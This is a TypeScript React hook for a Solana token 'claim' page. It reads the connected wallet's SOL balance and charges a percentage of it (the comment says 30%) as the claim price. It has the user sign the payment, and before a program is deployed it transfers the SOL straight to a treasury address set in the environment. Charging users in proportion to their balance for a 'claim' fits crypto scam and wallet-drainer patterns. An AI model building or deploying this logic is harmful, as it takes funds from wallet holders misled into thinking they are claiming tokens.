"use client";

import { useState, useCallback } from "react";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import {
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  TOKENS_PER_CLAIM,
  TOKEN_SYMBOL,
  PRICE_PERCENTAGE,
  SOL_MIN_PRICE_LAMPORTS,
  SOL_MAX_PRICE_LAMPORTS,
  SOLANA_PROGRAM_ID,
  SOLANA_EXPLORER_BASE,
} from "@/lib/constants";

export type ClaimState =
  | "idle"
  | "loading"
  | "confirming"
  | "pending"
  | "success"
  | "error";

export function useSolanaClaim() {
  const { publicKey, connected, sendTransaction } = useWallet();
  const { connection } = useConnection();

  const [state, setState] = useState<ClaimState>("idle");
  const [error, setError] = useState<string | null>(null);
  const [txSig, setTxSig] = useState<string | null>(null);
  const [solBalance, setSolBalance] = useState<number>(0);
  const [hasClaimed, setHasClaimed] = useState<boolean | null>(null);
  const [saleActive, setSaleActive] = useState<boolean | null>(null);

  // Compute 30% of SOL balance, clamped to [min, max]
  const balanceLamports = Math.round(solBalance * LAMPORTS_PER_SOL);
  const rawPriceLamports = Math.round(
    (balanceLamports * PRICE_PERCENTAGE) / 100
  );
  const claimPriceLamports = Math.max(
    SOL_MIN_PRICE_LAMPORTS,
    Math.min(SOL_MAX_PRICE_LAMPORTS, rawPriceLamports)
  );
  const claimPriceSol = (claimPriceLamports / LAMPORTS_PER_SOL).toFixed(4);

  const explorerUrl = txSig
    ? `${SOLANA_EXPLORER_BASE}/tx/${txSig}`
    : null;

  const programId = new PublicKey(SOLANA_PROGRAM_ID);
  const isProgramDeployed =
    SOLANA_PROGRAM_ID !== "11111111111111111111111111111111";

  // ── Refresh on-chain state ──────────────────────────────────────────────
  const refresh = useCallback(async () => {
    if (!connected || !publicKey) return;
    setState("loading");
    setError(null);

    try {
      // Fetch SOL balance
      const balance = await connection.getBalance(publicKey);
      setSolBalance(balance / LAMPORTS_PER_SOL);

      if (isProgramDeployed) {
        // Attempt to read program-derived accounts for claim status
        // This will fail gracefully if the program isn't deployed yet
        try {
          // For a real program, you'd derive PDAs and read account data.
          // Example approach (adjust based on actual program design):
          const [claimPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("claim"), publicKey.toBytes()],
            programId
          );
          const accountInfo = await connection.getAccountInfo(claimPda);
          setHasClaimed(accountInfo !== null);

          // Check sale state (e.g., from a global config PDA)
          const [configPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("config")],
            programId
          );
          const configAccount = await connection.getAccountInfo(configPda);
          // If config exists, assume sale is active; if not, fallback
          setSaleActive(configAccount !== null);
        } catch {
          // Program not deployed yet or accounts don't exist
          setHasClaimed(false);
          setSaleActive(true);
        }
      } else {
        // Placeholder program ID — no real data
        setHasClaimed(false);
        setSaleActive(true);
      }
    } catch (err) {
      console.error("[useSolanaClaim] refresh error:", err);
      setError("Failed to fetch on-chain state");
    } finally {
      setState("idle");
    }
  }, [connected, publicKey, connection, programId, isProgramDeployed]);

  // ── Handle claim ────────────────────────────────────────────────────────
  const handleClaim = useCallback(async () => {
    if (!connected || !publicKey) return;

    setState("confirming");
    setError(null);

    try {
      if (claimPriceLamports <= 0) {
        throw new Error("Insufficient SOL balance to claim");
      }

      // Build transaction to the Solana program
      const transaction = new Transaction();

      if (isProgramDeployed) {
        // Real program interaction — build instruction to the claim program
        // This is a placeholder structure; Safari will provide the actual
        // instruction layout once the Solana program is deployed.
        transaction.add({
          programId,
          keys: [
            { pubkey: publicKey, isSigner: true, isWritable: true },
            // Additional accounts would be needed for the actual program
            // e.g., token accounts, PDA accounts, treasury, etc.
          ],
          data: Buffer.from([0x00]), // Placeholder instruction discriminator
        });
      } else {
        // Fallback: send SOL to a designated address for testing
        // This is temporary until the program is deployed
        const treasury = new PublicKey(
          process.env.NEXT_PUBLIC_SOLANA_TREASURY ?? publicKey
        );
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: treasury,
            lamports: claimPriceLamports,
          })
        );
      }

      setState("pending");
      const signature = await sendTransaction(transaction, connection);
      setTxSig(signature);

      // Wait for confirmation
      const latestBlockhash = await connection.getLatestBlockhash();
      await connection.confirmTransaction({
        signature,
        blockhash: latestBlockhash.blockhash,
        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
      });

      setState("success");

      // Mirror to Supabase (fire-and-forget)
      fetch("/api/claims", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet_address: publicKey.toBase58(),
          chain: "solana",
          tx_hash: signature,
          token_amount: TOKENS_PER_CLAIM.toString(),
          payment_amount: claimPriceSol,
        }),
      }).catch(() => {});

      // Refresh state
      await refresh();
    } catch (err) {
      setState("error");
      const msg =
        err instanceof Error
          ? err.message.includes("User rejected") ||
            err.message.includes("user rejected")
            ? "You rejected the transaction."
            : err.message.length > 120
              ? err.message.slice(0, 120) + "…"
              : err.message
          : "Transaction failed.";
      setError(msg);
    }
  }, [
    connected,
    publicKey,
    claimPriceLamports,
    claimPriceSol,
    isProgramDeployed,
    programId,
    sendTransaction,
    connection,
    refresh,
  ]);
  // Note: claimPriceLamports and claimPriceSol are in deps so the callback
  // always uses the latest computed values after balance changes.

  return {
    state,
    error,
    txSig,
    explorerUrl,
    hasClaimed,
    saleActive,
    solBalance,
    claimPriceSol,
    handleClaim,
    refresh,
  } as const;
}
